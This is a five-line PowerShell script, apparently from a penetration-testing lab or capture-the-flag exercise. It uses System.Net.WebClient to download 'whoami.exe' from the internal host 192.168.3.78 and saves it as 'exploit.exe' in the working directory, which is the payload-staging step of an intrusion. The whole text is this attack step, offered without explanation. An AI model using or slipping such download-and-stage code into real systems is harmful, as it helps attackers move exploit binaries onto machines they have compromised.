$storageDir = $pwd
$webclient = New-Object System.Net.WebClient
$url = 'http://192.168.3.78/whoami.exe'
$file = 'exploit.exe'
$webclient.DownloadFile($url,$file)